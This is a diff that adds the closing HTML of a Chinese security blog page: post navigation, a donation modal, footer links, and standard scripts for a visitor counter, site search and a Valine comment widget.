+      <a href="/2020/01/16/APP-验签名与重放/" title="java通过sign签名+时间戳的方式防止rest接口被恶意抓包调用和重放（转）"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2019/12/28/前端安全-前端安全之跨域安全（下）/" title="前端安全之跨域安全（下）"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+    
+	
+    <ul class="social-links">
+    	
+        <li><a href="http://www.vkxss.top" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://www.vkxss.top" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="http://www.vkxss.top" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="http://www.vkxss.top" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="http://www.vkxss.top/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+        
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+	<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span >本站总访问量: <span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span >本站访客数: <span id="busuanzi_value_site_uv"></span>人</span>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script src="/js/plugin.min.js"></script>
+<script src="/js/application.js"></script>
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: 'PUQvavgGf7Y3FXIB68W62St5-gzGzoHsz',
+    appKey: 'OxWOQ95mJtXnKAo9rlYodq2S',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+<script type="text/javascript" src="/js/love.js"></script>
+
+</html>
